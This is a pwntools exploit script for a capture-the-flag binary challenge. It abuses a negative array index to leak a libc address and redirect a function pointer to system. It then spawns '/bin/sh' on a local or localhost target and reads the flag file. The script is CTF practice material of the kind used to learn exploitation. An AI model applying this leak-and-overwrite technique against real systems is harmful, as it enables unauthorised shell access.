#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = '../challenge/chall'
elf = context.binary = ELF(exe, checksec=True)
libc = '../challenge/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '127.0.0.1', 7003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x132f
# breakrva 0x137f
breakrva 0x1555
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    # this part can be skipped tbh, since the offset between two function is fixed
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'-4')
    io.sendlineafter(b'>', b'idk')
    io.sendlineafter(b'>', b'+')

    io.recvuntil(b'lanes: ')
    libc.address = int(io.recvline()) - libc.sym['fgets']

    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'/bin/sh\x00')
    io.sendlineafter(b'>', b'77')

    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', b'-4')
    io.sendlineafter(b'>', str(libc.sym['system'] - libc.sym['fgets']).encode())

    # trigger system('/bin/sh')
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', b'1')

    io.sendline('cat flag.txt')

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()